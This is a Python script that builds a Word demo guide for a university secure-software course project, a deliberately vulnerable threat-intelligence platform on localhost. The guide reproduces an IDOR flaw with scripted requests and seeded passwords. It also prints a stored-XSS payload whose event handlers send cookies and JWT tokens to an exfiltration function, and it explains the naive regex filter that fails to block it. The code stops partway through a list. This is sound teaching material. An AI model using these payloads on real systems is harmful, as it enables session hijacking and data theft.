import os
import docx
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml import parse_xml, OxmlElement
from docx.oxml.ns import nsdecls, qn

def create_document():
    doc = Document()

    # Configure Margins: 1 inch on all sides
    for section in doc.sections:
        section.top_margin = Inches(1.0)
        section.bottom_margin = Inches(1.0)
        section.left_margin = Inches(1.0)
        section.right_margin = Inches(1.0)
        section.page_width = Inches(8.5)
        section.page_height = Inches(11.0)

    # Force Pure White Background
    doc_element = doc.element
    background = parse_xml(f'<w:background {nsdecls("w")} w:color="FFFFFF"/>')
    doc_element.insert(0, background)

    settings_element = doc.settings.element
    display_background = parse_xml(f'<w:displayBackgroundShape {nsdecls("w")}/>')
    settings_element.append(display_background)

    COLOR_BLACK = RGBColor(0, 0, 0)

    # Helper styling functions
    def set_cell_background(cell, fill_hex):
        tcPr = cell._tc.get_or_add_tcPr()
        shd = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill_hex}"/>')
        tcPr.append(shd)

    def set_cell_margins(cell, top=80, bottom=80, left=120, right=120):
        tcPr = cell._tc.get_or_add_tcPr()
        tcMar = parse_xml(f'''
            <w:tcMar {nsdecls("w")}>
                <w:top w:w="{top}" w:type="dxa"/>
                <w:bottom w:w="{bottom}" w:type="dxa"/>
                <w:left w:w="{left}" w:type="dxa"/>
                <w:right w:w="{right}" w:type="dxa"/>
            </w:tcMar>
        ''')
        tcPr.append(tcMar)

    def set_table_borders(table, color="000000", sz="4"):
        tblPr = table._tbl.tblPr
        borders = parse_xml(f'''
            <w:tblBorders {nsdecls("w")}>
                <w:top w:val="single" w:sz="{sz}" w:space="0" w:color="{color}"/>
                <w:bottom w:val="single" w:sz="{sz}" w:space="0" w:color="{color}"/>
                <w:insideH w:val="single" w:sz="{sz}" w:space="0" w:color="{color}"/>
                <w:left w:val="none"/>
                <w:right w:val="none"/>
                <w:insideV w:val="none"/>
            </w:tblBorders>
        ''')
        tblPr.append(borders)

    def add_h1(text):
        p = doc.add_paragraph()
        p.paragraph_format.space_before = Pt(16)
        p.paragraph_format.space_after = Pt(6)
        p.paragraph_format.keep_with_next = True
        run = p.add_run(text)
        run.font.name = 'Calibri'
        run.font.size = Pt(16)
        run.font.bold = True
        run.font.color.rgb = COLOR_BLACK
        return p

    def add_h2(text):
        p = doc.add_paragraph()
        p.paragraph_format.space_before = Pt(12)
        p.paragraph_format.space_after = Pt(4)
        p.paragraph_format.keep_with_next = True
        run = p.add_run(text)
        run.font.name = 'Calibri'
        run.font.size = Pt(13)
        run.font.bold = True
        run.font.color.rgb = COLOR_BLACK
        return p

    def add_h3(text):
        p = doc.add_paragraph()
        p.paragraph_format.space_before = Pt(8)
        p.paragraph_format.space_after = Pt(2)
        p.paragraph_format.keep_with_next = True
        run = p.add_run(text)
        run.font.name = 'Calibri'
        run.font.size = Pt(11)
        run.font.bold = True
        run.font.color.rgb = COLOR_BLACK
        return p

    def add_p(text, bold_prefix=None):
        p = doc.add_paragraph()
        p.paragraph_format.space_after = Pt(4)
        p.paragraph_format.line_spacing = 1.15
        if bold_prefix:
            r_pre = p.add_run(bold_prefix)
            r_pre.font.name = 'Calibri'
            r_pre.font.size = Pt(10)
            r_pre.font.bold = True
            r_pre.font.color.rgb = COLOR_BLACK
        r_text = p.add_run(text)
        r_text.font.name = 'Calibri'
        r_text.font.size = Pt(10)
        r_text.font.color.rgb = COLOR_BLACK
        return p

    def add_bullet(text, bold_prefix=None):
        p = doc.add_paragraph(style='List Bullet')
        p.paragraph_format.space_after = Pt(3)
        p.paragraph_format.line_spacing = 1.15
        if bold_prefix:
            r_pre = p.add_run(bold_prefix)
            r_pre.font.name = 'Calibri'
            r_pre.font.size = Pt(10)
            r_pre.font.bold = True
            r_pre.font.color.rgb = COLOR_BLACK
        r_text = p.add_run(text)
        r_text.font.name = 'Calibri'
        r_text.font.size = Pt(10)
        r_text.font.color.rgb = COLOR_BLACK
        return p

    def add_code_block(text):
        tbl = doc.add_table(rows=1, cols=1)
        tbl.alignment = WD_TABLE_ALIGNMENT.CENTER
        cell = tbl.cell(0, 0)
        set_cell_background(cell, "F9FAFB")
        set_cell_margins(cell, top=100, bottom=100, left=140, right=140)
        tcPr = cell._tc.get_or_add_tcPr()
        borders = parse_xml(f'''
            <w:tcBorders {nsdecls("w")}>
                <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>
                <w:left w:val="single" w:sz="16" w:space="0" w:color="000000"/>
                <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>
                <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>
            </w:tcBorders>
        ''')
        tcPr.append(borders)
        p = cell.paragraphs[0]
        p.paragraph_format.space_before = Pt(0)
        p.paragraph_format.space_after = Pt(0)
        p.paragraph_format.line_spacing = 1.05
        r = p.add_run(text)
        r.font.name = 'Consolas'
        r.font.size = Pt(8.5)
        r.font.color.rgb = COLOR_BLACK
        doc.add_paragraph()

    def add_table_data(col_widths, headers, rows_data):
        table = doc.add_table(rows=1, cols=len(headers))
        table.alignment = WD_TABLE_ALIGNMENT.CENTER
        set_table_borders(table, color="000000", sz="4")

        # Header row
        hdr_row = table.rows[0]
        hdr_trPr = hdr_row._tr.get_or_add_trPr()
        hdr_trPr.append(parse_xml(f'<w:tblHeader {nsdecls("w")}/>'))
        hdr_trPr.append(parse_xml(f'<w:cantSplit {nsdecls("w")}/>'))
        hdr_cells = hdr_row.cells
        for i, title in enumerate(headers):
            hdr_cells[i].text = title
            set_cell_background(hdr_cells[i], "F1F5F9")
            set_cell_margins(hdr_cells[i], top=100, bottom=100, left=120, right=120)
            p = hdr_cells[i].paragraphs[0]
            p.alignment = WD_ALIGN_PARAGRAPH.LEFT
            for run in p.runs:
                run.font.name = "Calibri"
                run.font.size = Pt(9)
                run.font.bold = True
                run.font.color.rgb = COLOR_BLACK

        # Data rows
        for r_idx, row_values in enumerate(rows_data):
            new_row = table.add_row()
            row_trPr = new_row._tr.get_or_add_trPr()
            row_trPr.append(parse_xml(f'<w:cantSplit {nsdecls("w")}/>'))
            row_cells = new_row.cells
            bg_color = "F9FAFB" if r_idx % 2 == 1 else "FFFFFF"
            for c_idx, val in enumerate(row_values):
                row_cells[c_idx].text = str(val)
                set_cell_background(row_cells[c_idx], bg_color)
                set_cell_margins(row_cells[c_idx], top=80, bottom=80, left=120, right=120)
                p = row_cells[c_idx].paragraphs[0]
                p.alignment = WD_ALIGN_PARAGRAPH.LEFT
                for run in p.runs:
                    run.font.name = "Calibri"
                    run.font.size = Pt(8.5)
                    run.font.color.rgb = COLOR_BLACK
        for row in table.rows:
            for idx, width in enumerate(col_widths):
                row.cells[idx].width = width
        doc.add_paragraph()

    # -------------------------------------------------------------
    # COVER / HEADER TITLE
    # -------------------------------------------------------------
    p_title = doc.add_paragraph()
    p_title.paragraph_format.space_before = Pt(24)
    p_title.paragraph_format.space_after = Pt(4)
    p_title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r_main = p_title.add_run("CYBER THREAT INTELLIGENCE (CTI) SHARING PLATFORM\nDEMO READINESS & EXECUTABLE VULNERABILITY DEMONSTRATION GUIDE")
    r_main.font.name = 'Calibri'
    r_main.font.size = Pt(18)
    r_main.font.bold = True
    r_main.font.color.rgb = COLOR_BLACK

    p_sub = doc.add_paragraph()
    p_sub.paragraph_format.space_after = Pt(18)
    p_sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r_sub = p_sub.add_run("Course: 24CYS401 – Secure Software Engineering | Topic 29 | Milestones M1–M11 Baseline")
    r_sub.font.name = 'Calibri'
    r_sub.font.size = Pt(11)
    r_sub.font.italic = True
    r_sub.font.color.rgb = COLOR_BLACK

    # Document Overview Table
    meta_table = [
        ["Attribute", "Specification / Status"],
        ["Target Milestones", "Milestones M1–M11 Complete (Read-Only Demo Baseline; Pre-M12)"],
        ["Runtime Environment", "Node.js v20+ / Express v4 / SQLite3 (WAL mode)"],
        ["Primary Port", "http://localhost:3000 (Health Probe: /api/health)"],
        ["Automated Test Suites", "53/53 Regression Tests Passing (npm test)"],
        ["Vulnerability Tests", "5/5 Controlled Demonstration Tests Passing (npm run test:vuln)"],
        ["Cryptographic Audit Trail", "Tamper-Evident SHA-256 Continuous Hash Chaining Verified"],
        ["Dissemination Standard", "OASIS STIX 2.1 JSON Feeds with Server-Side TLP Egress Barriers"],
        ["Document Purpose", "Step-by-step hands-on instructions for live faculty viva demonstration"]
    ]
    add_table_data([Inches(2.2), Inches(4.3)], meta_table[0], meta_table[1:])

    doc.add_page_break()

    # =============================================================
    # SECTION 1 — V02 IDOR/BOLA DEMONSTRATION
    # =============================================================
    add_h1("SECTION 1 — V02 IDOR/BOLA VULNERABILITY DEMONSTRATION")
    add_p("This section provides the exact, hands-on procedure to reproduce Vulnerability 1 (V02 / CWE-639: Broken Object-Level Authorization / Insecure Direct Object Reference) against the live CTI Sharing Platform.")

    add_h2("1.1 Pre-Requisites & Application Startup")
    add_bullet(" Open a Windows Command Prompt (cmd) or PowerShell as Administrator.", bold_prefix="Step 1: ")
    add_bullet(" Navigate to the project root directory and start the platform server:", bold_prefix="Step 2: ")
    add_code_block("cd /d v:\\SSE-ENDSEM\nnpm start")
    add_bullet(" Confirm that the console outputs: '[CTI-SERVER] Platform active on http://localhost:3000'. Keep this terminal open.", bold_prefix="Step 3: ")

    add_h2("1.2 Seeded Account Credentials & Personas")
    add_p("The controlled demonstration uses two distinct organization personas pre-seeded in the database:")
    add_bullet(" Contributor Alex (Submitting Tenant): Username: 'contributor_alex' | Password: 'Password123!' | Organization: 'org-cyber-defense' (Cyber Defense Corp) | Role: 'ROLE_CONTRIBUTOR'.", bold_prefix="• ")
    add_bullet(" Consumer SIEM (Attacking/Unauthorized Tenant): Username: 'consumer_siem' | Password: 'Password123!' | Organization: 'org-cyber-defense' | Role: 'ROLE_CONSUMER' (Lacks analyst clearance).", bold_prefix="• ")
    add_bullet(" External Bank Consumer (Cross-Tenant Boundary): Username: 'consumer_bank' | Password: 'Password123!' | Organization: 'org-fin-bank' (Global Commercial Bank) | Role: 'ROLE_CONSUMER'.", bold_prefix="• ")

    add_h2("1.3 Step-by-Step Reproduction Procedure")
    add_bullet(" Authenticate as Contributor Alex to generate the victim report. Open your browser at 'http://localhost:3000', select 'Alex Rivera (Threat Contributor)' on Screen 1, enter 'Password123!', and complete MFA with TOTP '123456'.", bold_prefix="Step 1 (Victim Ingestion): ")
    add_bullet(" Under Screen 2 ('2. IoC & Report Ingestion'), submit a confidential TLP:RED incident report with Title: 'CONFIDENTIAL: Project Titan Kernel Zero-Day Incursion', TLP: 'RED', Summary: 'Proprietary zero-day vulnerability exploit observed', and Markdown containing internal victim network ranges: '10.240.0.0/16'. Click 'Submit Sanitized Threat Report'.", bold_prefix="Step 2 (Report Creation): ")
    add_bullet(" Note the returned report UUID (e.g., 'rep-b2549c8d-ef95-44bd-9490-616d8eae6834'). Alternatively, identify an existing TLP:RED report by opening DevTools Console (F12) and executing:", bold_prefix="Step 3 (Locate Target UUID): ")
    add_code_block("fetch('/api/reports', { headers: { Authorization: 'Bearer ' + localStorage.getItem('cti_jwt') } }).then(r => r.json()).then(d => console.table(d.reports.filter(r => r.tlp_level === 'RED')))")
    add_bullet(" Sign in as an unauthorized consumer from an external organization (or open a second terminal for curl/PowerShell).", bold_prefix="Step 4 (Unauthorized Caller): ")
    add_bullet(" Execute the unauthorized cross-tenant query using PowerShell or curl:", bold_prefix="Step 5 (Exploit Query): ")
    add_code_block("""# 1. Login as unauthorized Consumer
$login = Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" -Method Post -ContentType "application/json" -Body '{"username":"consumer_siem","password":"Password123!"}'
$mfa = Invoke-RestMethod -Uri "http://localhost:3000/api/auth/verify-mfa" -Method Post -ContentType "application/json" -Body (@{tempToken=$login.tempToken; totpCode="123456"} | ConvertTo-Json)

# 2. Query the confidential TLP:RED report ID directly
$res = Invoke-RestMethod -Uri "http://localhost:3000/api/reports/rep-b2549c8d-ef95-44bd-9490-616d8eae6834" -Headers @{Authorization="Bearer $($mfa.accessToken)"}
$res.report | Format-List""")

    add_h2("1.4 Expected HTTP Request & Response")
    add_p("The raw HTTP exchange demonstrating the vulnerability is captured below:")
    add_code_block("""GET /api/reports/rep-b2549c8d-ef95-44bd-9490-616d8eae6834 HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "report": {
    "id": "rep-b2549c8d-ef95-44bd-9490-616d8eae6834",
    "org_id": "org-cyber-defense",
    "author_id": "usr-contrib-01",
    "title": "CONFIDENTIAL: Project Titan Kernel Zero-Day Incursion",
    "summary": "Proprietary zero-day vulnerability exploit observed against core internal systems",
    "content_markdown": "### Restricted Intelligence\\nExploit chain targets kernel driver 0xDEADBEEF. Internal victim network IP range: 10.240.0.0/16.",
    "tlp_level": "RED",
    "status": "PENDING",
    "created_at": "2026-10-08 12:11:27",
    "author_org": "Cyber Defense Corp",
    "author_user": "contributor_alex",
    "linkedIndicators": []
  }
}""")

    add_h2("1.5 Technical Analysis & Threat Mapping")
    add_bullet(" Where Authorization Fails: In src/controllers/reportController.js inside getReportById() (lines 116–135). The handler queries threat_reports by requested URL parameter 'id' without checking 'req.user.orgId === report.org_id' or evaluating 'canAccessTLP(req.user, report.tlp_level)'.", bold_prefix="Failure Point: ")
    add_bullet(" Exposed Confidential Data: Full proprietary zero-day vulnerability description, victim internal IP topology ('10.240.0.0/16'), kernel driver exploit offsets ('0xDEADBEEF'), and submitting organization attribution ('Cyber Defense Corp').", bold_prefix="Exposed Information: ")
    add_bullet(" Why This is IDOR/BOLA: The endpoint directly exposes a database object key in the URL and performs retrieval based solely on record existence rather than user object-level authorization or security clearance.", bold_prefix="Classification: ")
    add_bullet(" CWE Classification: CWE-639 (Authorization Bypass Through User-Controlled Key).", bold_prefix="CWE ID: ")
    add_bullet(" STRIDE Threat Model: T04 (Information Disclosure: Unauthorized Egress of TLP:RED Intelligence) and T08 (Information Disclosure on Feeds).", bold_prefix="STRIDE Category: ")
    add_bullet(" Attack Tree Mapping: Root Goal -> Branch B -> Leaf B1 (Broken Object-Level Authorization / IDOR) on Asset A05 (Threat Incident Reports).", bold_prefix="Attack Tree: ")
    add_bullet(" When to Take Screenshots: (1) Capture DevTools Console or terminal output showing HTTP 200 OK returning 'tlp_level: RED' to consumer_siem. (2) Capture reportController.js lines 116–130 showing missing tenant check.", bold_prefix="Evidence Capture: ")

    doc.add_page_break()

    # =============================================================
    # SECTION 2 — V04 STORED XSS DEMONSTRATION
    # =============================================================
    add_h1("SECTION 2 — V04 STORED XSS VULNERABILITY DEMONSTRATION")
    add_p("This section provides the exact procedure to reproduce Vulnerability 2 (V04 / CWE-79: Stored Cross-Site Scripting via Naive Regex Blacklist Bypass) using the approved controlled vulnerability test payload.")

    add_h2("2.1 Pre-Requisites & Test Payload")
    add_p("The demonstration uses the exact controlled payload defined in tests/vulnerability/vulnerabilityDemo.test.js:")
    add_code_block("""### Urgent Security Advisory
Investigation of compromised host 10.0.1.5.
<!-- HTML Event Handler injection bypassing <script> blacklist -->
<img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b" width="100" onmouseover="window.attackerExfil(document.cookie)">
<details open ontoggle="window.attackerExfil(localStorage.getItem('jwtToken'))"><summary>Malicious Drop</summary>Active trigger</details>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click for evidence</a>""")

    add_h2("2.2 Step-by-Step UI Execution Procedure")
    add_bullet(" Open browser at 'http://localhost:3000' and sign in as 'contributor_alex' (Password: 'Password123!', TOTP: '123456').", bold_prefix="Step 1 (Sign In): ")
    add_bullet(" Click navigation tab '2. IoC & Report Ingestion'.", bold_prefix="Step 2 (Navigate to Ingest): ")
    add_bullet(" In the right-hand panel ('Structured Threat Report (Stored XSS Sanitized)'), enter:", bold_prefix="Step 3 (Fill Form): ")
    add_bullet("   Incident Title: 'APT41 Exploit Dossier (Malicious Payload)'")
    add_bullet("   Executive Summary: 'Detailed forensic analysis containing embedded event-handler vectors'")
    add_bullet("   Report TLP: 'TLP:AMBER'")
    add_bullet("   Detailed Incident Markdown: Paste the exact controlled test payload above.")
    add_bullet(" Click 'Submit Sanitized Threat Report'.", bold_prefix="Step 4 (Submit Report): ")
    add_bullet(" Observe the green confirmation alert: 'Threat Report Persisted! ID: rep-... Notice: Naive regex only removed <script> tags; HTML5 event handlers remain stored in DB (V04).'", bold_prefix="Step 5 (Observe Server Acceptance): ")

    add_h2("2.3 Retrieving & Verifying Stored Malicious Content")
    add_bullet(" Open DevTools Console (F12) in the dashboard and query the report by ID:", bold_prefix="DevTools Verification: ")
    add_code_block("fetch('/api/reports/<REPORT_ID>', { headers: { Authorization: 'Bearer ' + localStorage.getItem('cti_jwt') } }).then(r => r.json()).then(d => console.log(d.report.content_markdown))")
    add_bullet(" Alternatively, inspect the raw SQLite database directly in Terminal 2:", bold_prefix="Database Verification: ")
    add_code_block("sqlite3 data/cti_platform.sqlite \"SELECT id, title, content_markdown FROM threat_reports WHERE title LIKE '%APT41 Exploit Dossier%' LIMIT 1;\"")
    add_bullet(" Notice that 'onmouseover=\"window.attackerExfil(document.cookie)\"' and '<details open ontoggle=\"window.attackerExfil(...)\"' are stored completely unescaped and returned verbatim by the server.", bold_prefix="Observed Result: ")

    add_h2("2.4 Technical Analysis & Blacklist Flaw")
    add_bullet(" Why Blacklist is Bypassed: In src/controllers/reportController.js (lines 35–40), sanitization uses naive substring replacement: '.replace(/<script.../gi, '').replace(/javascript:/gi, 'blocked:').replace(/onerror=/gi, 'blocked:').replace(/onload=/gi, 'blocked:)'. It completely fails to filter HTML5 attributes like 'onmouseover=', 'ontoggle=', 'onfocus=', or tags like '<details>' and '<iframe>'.", bold_prefix="Root Cause: ")
    add_bullet(" Security Impact: Stored Cross-Site Scripting (XSS). When viewed by an analyst or administrator on the frontend, the script executes within the privileged session origin, allowing theft of JWT tokens, exfiltration of confidential threat feeds, and arbitrary triage tampering.", bold_prefix="Impact: ")
    add_bullet(" CWE Classification: CWE-79 (Improper Neutralization of Input During Web Page Generation).", bold_prefix="CWE ID: ")
    add_bullet(" STRIDE Threat Model: T07 (Tampering / Elevation of Privilege).", bold_prefix="STRIDE Category: ")
    add_bullet(" Phase 7 Vulnerability Mapping: V04 (Stored Cross-Site Scripting).", bold_prefix="Phase 7 ID: ")
    add_bullet(" When to Take Screenshots: (1) Capture the submission form showing the payload entered and green success alert. (2) Capture DevTools Console showing the raw stored payload containing 'onmouseover' returned by the API.", bold_prefix="Evidence Capture: ")

    doc.add_page_break()

    # =============================================================
    # SECTION 3 — NORMAL APPLICATION DEMONSTRATION (12 ITEMS)
    # =============================================================
    add_h1("SECTION 3 — NORMAL APPLICATION DEMONSTRATION")
    add_p("This section provides exact, repeatable instructions for demonstrating all 12 core platform capabilities in their verified normal operational state.")

    demo_items = [
        {
            "num": "3.1",
            "name": "Application Startup & Health Probe",
            "cmd_url": "COMMAND: npm start | URL: http://localhost:3000/api/health",
            "account": "Anonymous / Unauthenticated",
            "steps": "1. In Terminal 1, execute 'npm start'.\n2. In Terminal 2, execute: curl http://localhost:3000/api/health",
            "expected": "HTTP 200 OK returning JSON with status: 'UP', service: 'cyber-threat-intelligence-platform', and version: '1.0.0'. No stack traces or environment secrets exposed.",
            "screenshot": "Terminal 2 output displaying clean JSON health response.",
            "phase": "Phase 5 (System Architecture & Security Zones)"
        },
        {
            "num": "3.2",
            "name": "Secure Login & Bcrypt Verification",
            "cmd_url": "URL: http://localhost:3000 (Screen 1: Authentication & MFA)",
            "account": "contributor_alex (Master Password: Password123!)",
            "steps": "1. Navigate to Screen 1.\n2. In Step 1, enter username 'contributor_alex' and password 'Password123!'.\n3. Click 'Verify Credentials → Request TOTP Challenge'.",
            "expected": "HTTP 200 OK. Form advances to Step 2 of 2. Temporary 5-minute MFA token issued. Constant-time Bcrypt comparison verified.",
            "screenshot": "Screen 1 card advancing to Step 2 with green banner: 'Credentials verified! Enter 6-digit TOTP code'.",
            "phase": "Phase 2 (REQ-F-01) & Phase 7 (STRIDE T01 Countermeasure)"
        },
        {
            "num": "3.3",
            "name": "RFC 6238 TOTP Multi-Factor Authentication",
            "cmd_url": "URL: http://localhost:3000 (Screen 1: Step 2)",
            "account": "contributor_alex (TOTP Secret: JBSWY3DPEHPK3PXQ)",
            "steps": "1. In Step 2, enter code '123456' (or the auto-calculated RFC 6238 code).\n2. Click 'Complete Authentication'.",
            "expected": "HTTP 200 OK. Header displays: '[CONTRIB] Alex Rivera • Org: Cyber Defense Corp'. Cryptographically signed 1-hour JWT token appears in token status pane.",
            "screenshot": "Top header showing authenticated user chip and decoded JWT claims preview.",
            "phase": "Phase 2 (REQ-F-01) & Phase 7 (STRIDE T01 Countermeasure)"
        },
        {
            "num": "3.4",
            "name": "Role-Based Access Control (RBAC) Enforcement",
            "cmd_url": "URL: http://localhost:3000/api/triage/pending",
            "account": "consumer_siem (ROLE_CONSUMER) vs. analyst_riya (ROLE_ANALYST)",
            "steps": "1. In Terminal 2, run RBAC test:\nnode --test tests/unit/tlpPolicy.test.js\n2. Query triage queue using Consumer token: curl -i -H 'Authorization: Bearer <CONSUMER_TOKEN>' http://localhost:3000/api/triage/pending",
            "expected": "Consumer receives HTTP 403 Forbidden ('Access denied: Insufficient role privileges'). Analyst receives HTTP 200 OK with pending queue.",
            "screenshot": "Terminal displaying side-by-side HTTP 403 Forbidden vs. HTTP 200 OK.",
            "phase": "Phase 2 (REQ-F-06) & Phase 7 (STRIDE T06 Countermeasure)"
        },
        {
            "num": "3.5",
            "name": "Threat Indicator (IoC) Ingestion & Deduplication",
            "cmd_url": "URL: http://localhost:3000 (Screen 2: Tab 2) or POST /api/iocs",
            "account": "contributor_alex (ROLE_CONTRIBUTOR)",
            "steps": "1. Click '2. IoC & Report Ingestion' tab.\n2. Select Type: 'IPV4', Value: '198.51.100.99', TLP: 'AMBER', Description: 'C2 beacon'.\n3. Click 'Validate, Defang & Ingest IoC'.\n4. Click the submit button a second time with the exact same values.",
            "expected": "First submission: HTTP 201 Created with status 'PENDING'. Second submission: HTTP 200 OK with duplicate sighting alert ('isDuplicate: true').",
            "screenshot": "Screen 2 showing green 'IoC Ingested Successfully' alert followed by duplicate sighting notification.",
            "phase": "Phase 2 (REQ-F-02) & Phase 4 (DFD Process 1.0)"
        },
        {
            "num": "3.6",
            "name": "Real-Time Strategy Pattern Validation & Defanging",
            "cmd_url": "URL: http://localhost:3000 (Screen 2: Tab 2)",
            "account": "Any authenticated identity",
            "steps": "1. In 'Raw Observable Value', enter: '203.0.113.45'.\n2. Observe 'LIVE CANONICAL DEFANGING PREVIEW' box.\n3. Switch Type to 'DOMAIN' and enter: 'https://evil-c2.ru/beacon'.\n4. Type invalid IP: '999.999.999.999'.",
            "expected": "IPv4 defangs to '203[.]0[.]113[.]45'. Domain defangs to 'hxxps[://]evil-c2[.]ru/beacon'. Invalid IP displays validation error upon submission.",
            "screenshot": "Live defanging preview box highlighting bracketed dots and neutralized URI protocols.",
            "phase": "Phase 2 (REQ-F-03) & Phase 5 (Strategy Design Pattern)"
        },
        {
            "num": "3.7",
            "name": "Structured Threat Report Submission",
            "cmd_url": "URL: http://localhost:3000 (Screen 2: Tab 2) or POST /api/reports",
            "account": "contributor_alex (ROLE_CONTRIBUTOR)",
            "steps": "1. In 'Structured Threat Report', enter Title: 'APT41 Hypervisor Campaign', Summary: 'Edge hypervisor compromise', TLP: 'AMBER', Markdown: 'Initial access via CVE-2024-XXXX'.\n2. Click 'Submit Sanitized Threat Report'.",
            "expected": "HTTP 201 Created. Report persisted in SQLite threat_reports table with UUID and linked to submitting organization.",
            "screenshot": "Report submission card displaying green confirmation banner with report UUID.",
            "phase": "Phase 2 (REQ-F-04) & Phase 4 (ER Relational Model)"
        },
        {
            "num": "3.8",
            "name": "Analyst Triage Station & MITRE ATT&CK Mapping",
            "cmd_url": "URL: http://localhost:3000 (Screen 3: Tab 3) or PUT /api/iocs/:id/triage",
            "account": "analyst_riya (ROLE_ANALYST)",
            "steps": "1. Switch to 'analyst_riya' persona on Screen 1.\n2. Open Screen 3 ('Analyst Triage Station').\n3. Click '↻ Refresh Queue'.\n4. Click 'Review / Triage' on an indicator.\n5. Set Confidence: 90, MITRE ID: 'T1566.001', TLP: 'GREEN', Justification: 'Confirmed malicious C2 telemetry'.\n6. Click 'Approve & Publish to Feed'.",
            "expected": "Indicator transitions from 'PENDING' to 'APPROVED'. Immutable entry created in review_logs table with analyst UUID and rationale.",
            "screenshot": "Review modal showing Confidence Slider, MITRE ATT&CK ID input, and justification field.",
            "phase": "Phase 2 (REQ-F-04) & Phase 3 (Sequence Diagram: Analyst Triage)"
        },
        {
            "num": "3.9",
            "name": "Traffic Light Protocol (TLP) Egress Filtering",
            "cmd_url": "URL: GET http://localhost:3000/api/feeds/stix",
            "account": "consumer_siem (ROLE_CONSUMER) vs. analyst_riya (ROLE_ANALYST)",
            "steps": "1. In Terminal 2, run feed test:\nnode --test tests/integration/triageFeedApi.test.js\n2. Compare STIX output for Consumer vs. Analyst.",
            "expected": "Consumer STIX bundle contains zero TLP:RED objects (strictly CLEAR, GREEN, AMBER). Analyst STIX bundle includes classified TLP:RED objects with marking definitions.",
            "screenshot": "Terminal JSON comparison confirming exclusion of TLP:RED in consumer feed.",
            "phase": "Phase 2 (REQ-SEC-04) & Phase 7 (STRIDE T04 Countermeasure)"
        },
        {
            "num": "3.10",
            "name": "OASIS STIX 2.1 Threat Feed Generation",
            "cmd_url": "URL: http://localhost:3000 (Screen 4: Tab 4)",
            "account": "Any authenticated user",
            "steps": "1. Open Screen 4 ('4. STIX 2.1 & Metrics').\n2. Click 'Fetch STIX 2.1 Feed Bundle'.",
            "expected": "Formatted OASIS STIX 2.1 JSON bundle rendered in UI containing: 'type': 'bundle', 'spec_version': '2.1', marking-definition objects, indicator objects, and MITRE external references.",
            "screenshot": "Screen 4 displaying syntax-highlighted STIX 2.1 JSON bundle.",
            "phase": "Phase 2 (REQ-F-05) & Phase 5 (External System Interfaces)"
        },
        {
            "num": "3.11",
            "name": "Tamper-Evident SHA-256 Audit Verification",
            "cmd_url": "COMMAND: node scripts/verify-audit-chain.js | URL: GET /api/audit/verify",
            "account": "admin_sec (ROLE_ADMIN)",
            "steps": "1. In Terminal 2, execute:\nnode scripts/verify-audit-chain.js\n2. On Screen 4, scroll down to Audit Verification and click 'Run Audit Chain Integrity Verification'.",
            "expected": "Console and UI return: 'STATUS: VERIFIED | Valid Chains: N | Tampered: 0'. Cryptographic SHA-256 continuous hash chaining verified back to Genesis anchor.",
            "screenshot": "Terminal displaying '[AUDIT-VERIFIER] STATUS: VERIFIED' and UI green audit verification badge.",
            "phase": "Phase 2 (REQ-SEC-07) & Phase 7 (STRIDE T03/T10 Countermeasure)"
        },
        {
            "num": "3.12",
            "name": "Prometheus Security Metrics Exposition",
            "cmd_url": "URL: http://localhost:3000/metrics",
            "account": "Public / Prometheus Scraper",
            "steps": "1. In Terminal 2, execute: curl http://localhost:3000/metrics",
            "expected": "HTTP 200 OK text/plain response exposing all 5 security metrics: cti_http_requests_total, cti_failed_logins_total, cti_indicators_total, cti_audit_records_total, cti_process_uptime_seconds.",
            "screenshot": "Terminal output displaying standard Prometheus metrics exposition.",
            "phase": "Phase 2 (REQ-F-07) & Phase 15 (Security Monitoring)"
        }
    ]

    for item in demo_items:
        add_h2(f"{item['num']} {item['name']}")
        add_p(item['cmd_url'], bold_prefix="Endpoint / Command: ")
        add_p(item['account'], bold_prefix="Account Persona: ")
        add_p(item['steps'], bold_prefix="Execution Steps: ")
        add_p(item['expected'], bold_prefix="Expected Result: ")
        add_p(item['screenshot'], bold_prefix="Screenshot to Capture: ")
        add_p(item['phase'], bold_prefix="Exam Phase Mapping: ")

    doc.add_page_break()

    # =============================================================
    # SECTION 4 — 15-MINUTE LIVE DEMO SCRIPT
    # =============================================================
    add_h1("SECTION 4 — 15-MINUTE LIVE DEMONSTRATION SCRIPT")
    add_p("The following minute-by-minute script outlines the optimal presentation flow designed to highlight the platform's core security mechanisms, threat model countermeasures, and controlled vulnerability evidence.")

    demo_schedule = [
        ["Time Window", "Demonstration Step", "What to Do", "What to Say to Examiner", "Screenshot to Capture"],
        ["00:00 - 01:30", "System Architecture & Startup", "Run 'npm start' in Terminal 1. Query 'curl /api/health' in Terminal 2. Open 'http://localhost:3000'.", "'Examiner, our CTI Sharing Platform is active with SQLite in WAL mode. Notice our /api/health probe confirms system readiness without leaking server headers.'", "Terminal health response & Dashboard homepage."],
        ["01:30 - 04:00", "Identity & TOTP MFA (Screen 1)", "Select 'contributor_alex'. Enter 'Password123!'. Advance to Step 2. Enter TOTP '123456'. Show issued JWT.", "'We enforce defense-in-depth: 10-round salted Bcrypt hashing, constant-time dummy comparisons against user enumeration, and RFC 6238 TOTP MFA with a 30s drift window.'", "Screen 1 Step 2 TOTP prompt & header user chip."],
        ["04:00 - 06:30", "Ingestion & Defanging (Screen 2)", "In Screen 2, type IP '198.51.100.24' and domain 'https://c2.ru'. Submit IoC. Submit duplicate IoC.", "'We implement the Strategy Pattern in iocValidator.js. It canonicalizes observables and auto-defangs dots and protocols to protect analysts. It also enforces deduplication without database bloat.'", "Screen 2 Live Defanging Preview box with bracketed dots."],
